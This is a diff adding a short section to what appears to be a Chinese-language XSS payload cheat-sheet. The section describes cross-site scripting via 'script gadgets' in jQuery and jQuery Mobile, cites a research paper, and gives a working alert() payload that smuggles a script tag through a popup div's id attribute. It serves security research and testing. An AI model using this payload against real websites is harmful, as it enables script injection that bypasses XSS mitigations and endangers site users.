@@ -344,6 +344,18 @@ $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[
 </script>
 ```
 
+通过"代码重用"(code-reuse) 实现XSS
+
+参考[Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets](https://acmccs.github.io/papers/p1709-lekiesA.pdf)
+```
+如果目标站点本来就用到了下面这2个JavaScript库
+<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
+<script src="https://code.jquery.com/mobile/1.4.2/jquery.mobile-1.4.2.js"></script>
+
+可使用以下payload实现XSS
+<div data-role=popup id='--!><script>alert("XSS")</script>'></div>
+```
+
 #### Awesome Encoding
 
 |HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
